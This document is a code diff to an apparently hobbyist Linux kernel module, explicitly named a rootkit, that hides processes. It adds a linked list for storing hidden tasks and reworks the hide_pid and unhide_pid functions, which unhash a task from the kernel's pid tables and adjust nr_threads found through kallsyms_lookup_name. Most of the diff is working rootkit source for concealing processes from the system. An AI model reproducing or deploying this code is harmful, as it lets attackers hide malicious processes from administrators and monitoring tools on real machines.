@@ -17,6 +17,7 @@
  * along with this program.  If not, see <http://www.gnu.org/licenses/>. 
  */
 
+#include <linux/slab.h>
 #include <linux/namei.h>
 #include <linux/proc_fs.h>
 #include <linux/pid_namespace.h>
@@ -49,80 +50,52 @@ int unhide_pid(pid_t pid);
 void pinfo(const char *fmt, ...);
 void vpinfo(const char *fmt, va_list args);
 int *nr_threads = NULL;
-unsigned long process_counts = 0;
+//unsigned long process_counts = 0;
 
-void attach_pid(struct task_struct *task, enum pid_type type)
-{
-    struct pid_link *link = &task->pids[type];
-    hlist_add_head_rcu(&link->node, &link->pid->tasks[type]);
-}
+struct pid_list_node {
+	pid_t nr;
+	struct task_struct *task;
+	struct pid_list_node *next;
+} *pid_list_head = NULL, *pid_list_tail = NULL;
 
-static void __change_pid(struct task_struct *task, enum pid_type type,
-            struct pid *new)
-{
-    struct pid_link *link;
-    struct pid *pid;
-    //int tmp;
+void pid_list_create(void);
+void pid_list_destroy(void);
+void pid_list_push(pid_t nr, struct task_struct *task);
+struct task_struct *pid_list_pop(pid_t nr);
 
-    link = &task->pids[type];
-    pid = link->pid;
-
-    hlist_del_rcu(&link->node);
-/*
-	link->pid = new;
-
-    for (tmp = PIDTYPE_MAX; --tmp >= 0; )
-        if (!hlist_empty(&pid->tasks[tmp]))
-            return;
-
-    free_pid(pid);
-*/
-}
-
-static void __unhash_process(struct task_struct *p, bool group_dead)
-{
-    *nr_threads -= 1;
-	__change_pid(p, PIDTYPE_PID, NULL);
-/*
-    if (group_dead) {
-		__change_pid(p, PIDTYPE_PGID, NULL);
-		__change_pid(p, PIDTYPE_SID, NULL);
-
-        list_del_rcu(&p->tasks);
-        list_del_init(&p->sibling);
-        __this_cpu_dec(process_counts);
-    }
-    list_del_rcu(&p->thread_group);
-    list_del_rcu(&p->thread_node);
-*/
-}
+void __unhash_process(struct task_struct *p, bool group_dead);
+void __change_pid(struct task_struct *task, enum pid_type type,
+            struct pid *new);
+void attach_pid(struct task_struct *task, enum pid_type type);
 
 static int __init init_rootkit(void)
 {
     //pinfo("Hello world\n");
 
-	pid_hash = (struct hlist_head *) *((struct hlist_head **) kallsyms_lookup_name("pid_hash"));
-	pidhash_shift = (unsigned int) *((unsigned int *) kallsyms_lookup_name("pidhash_shift"));
+	//pid_hash = (struct hlist_head *) *((struct hlist_head **) kallsyms_lookup_name("pid_hash"));
+	//pidhash_shift = (unsigned int) *((unsigned int *) kallsyms_lookup_name("pidhash_shift"));
 	nr_threads = (int *) kallsyms_lookup_name("nr_threads");
-	process_counts = (unsigned long) kallsyms_lookup_name("process_counts");
+	//process_counts = (unsigned long) kallsyms_lookup_name("process_counts");
 
 	//pinfo("%p unhash_process", __unhash_process);
-	if (pid_hash == NULL || pidhash_shift == 0) {
-		pinfo("ERROR: pid_hash = %p, pidhash_shift = %d", pid_hash, pidhash_shift);
-		return -1;
-	}
+	//if (pid_hash == NULL || pidhash_shift == 0) {
+	//	pinfo("ERROR: pid_hash = %p, pidhash_shift = %d", pid_hash, pidhash_shift);
+	//	return -1;
+	//}
 
-	pinfo("pid_hash = %p, pidhash_shift = %d, nr_threads = %d, process_counts = %d\n", pid_hash, pidhash_shift, nr_threads, process_counts);
+	//pinfo("pid_hash = %p, pidhash_shift = %d, nr_threads = %d\n", pid_hash, pidhash_shift, nr_threads);
+
+	pid_list_create();
 
 	hide_pid(9311);
-	//unhide_pid(6661);
+	unhide_pid(9311);
 
 	return 0;
 }
 
 static void __exit cleanup_rootkit(void)
 {
-    //pinfo("Goodbye, ARP rootkit\n");
+	pid_list_destroy();
 }
 
 int hide_pid(pid_t nr) {
@@ -146,7 +119,7 @@ int hide_pid(pid_t nr) {
 		//if (pnr->nr == nr && pnr->ns == ns) {
 		pid = find_vpid(nr);
 		if (pid) {
-			pinfo("found pid %d", nr);
+			//pinfo("found pid %d", nr);
 			//pid = container_of(pnr, struct pid, numbers[ns->level]);
 			task = get_pid_task(pid, PIDTYPE_PID);
 			if (task) {
@@ -156,7 +129,8 @@ int hide_pid(pid_t nr) {
 //				task->tasks.next->prev = task->tasks.prev;
 //				task->tasks.prev->next = task->tasks.next;
 				__unhash_process(task, false);
-				attach_pid(task, PIDTYPE_PID);
+				pid_list_push(nr, task);
+//				attach_pid(task, PIDTYPE_PID);
 //				hlist_del_rcu(node);
 //				pid_hash[pid_hashfn(nr, ns)].first = NULL;
 				//snprintf(path_name, sizeof(path_name), "/proc/%d", nr);
@@ -187,12 +161,13 @@ int hide_pid(pid_t nr) {
 }
 
 int unhide_pid(pid_t nr) {
-	struct pid *pid;
+	//struct pid *pid;
 	struct task_struct *task;
 
-	pid = find_vpid(nr);
-	if (pid) {
-		task = get_pid_task(pid, PIDTYPE_PID);
+	//pid = find_vpid(nr);
+	//if (pid) {
+		//task = get_pid_task(pid, PIDTYPE_PID);
+		task = pid_list_pop(nr);
 		if (task) {
 			attach_pid(task, PIDTYPE_PID);
 
@@ -202,11 +177,114 @@ int unhide_pid(pid_t nr) {
 		} else {
 			pinfo("task not found");
 		}
-	} else {
-		pinfo("pid not found");
-	}
+	//} else {
+	//	pinfo("pid not found");
+	//}
 
 	return -1;
+}
+
+void pid_list_push(pid_t nr, struct task_struct *task) {
+	struct pid_list_node *node;
+
+	node = kmalloc(sizeof(struct pid_list_node), GFP_KERNEL);
+	if (node) {
+		pid_list_tail->next = node;
+		pid_list_tail = node;
+		node->next = NULL;
+		node->nr = nr;
+		node->task = task;
+	} else {
+		pinfo("pid_list_push kmalloc");
+	}
+}
+
+struct task_struct *pid_list_pop(pid_t nr) {
+	struct pid_list_node *node, *prev;
+	struct task_struct *task;
+
+	prev = node = pid_list_head;
+	while(node) {
+		if (node->nr == nr) {
+			task = node->task;
+			prev->next = node->next;
+			kfree(node);
+
+			return task;
+		}
+		prev = node;
+		node = node->next;
+	}
+
+	return NULL;
+}
+
+void pid_list_create() {
+	struct pid_list_node *node;
+
+	node = kmalloc(sizeof(struct pid_list_node), GFP_KERNEL);
+	node->next = NULL;
+	node->task = NULL;
+	node->nr = 0;
+
+	pid_list_head = pid_list_tail = node;
+}
+
+void pid_list_destroy() {
+	struct pid_list_node *node, *next;
+
+	node = pid_list_head;
+	while(node) {
+		next = node->next;
+		kfree(node);
+		node = next;
+	}
+}
+
+void attach_pid(struct task_struct *task, enum pid_type type)
+{
+    struct pid_link *link = &task->pids[type];
+    hlist_add_head_rcu(&link->node, &link->pid->tasks[type]);
+}
+
+void __change_pid(struct task_struct *task, enum pid_type type,
+            struct pid *new)
+{
+    struct pid_link *link;
+    struct pid *pid;
+    //int tmp;
+
+    link = &task->pids[type];
+    pid = link->pid;
+
+    hlist_del_rcu(&link->node);
+/*
+	link->pid = new;
+
+    for (tmp = PIDTYPE_MAX; --tmp >= 0; )
+        if (!hlist_empty(&pid->tasks[tmp]))
+            return;
+
+    free_pid(pid);
+*/
+}
+
+void __unhash_process(struct task_struct *p, bool group_dead)
+{
+    *nr_threads -= 1;
+	__change_pid(p, PIDTYPE_PID, NULL);
+/*
+    if (group_dead) {
+		__change_pid(p, PIDTYPE_PGID, NULL);
+		__change_pid(p, PIDTYPE_SID, NULL);
+
+        list_del_rcu(&p->tasks);
+        list_del_init(&p->sibling);
+        __this_cpu_dec(process_counts);
+    }
+    list_del_rcu(&p->thread_group);
+    list_del_rcu(&p->thread_node);
+*/
 }
 
 // from https://github.com/bashrc/LKMPG/blob/master/4.14.8/examples/print_string.c
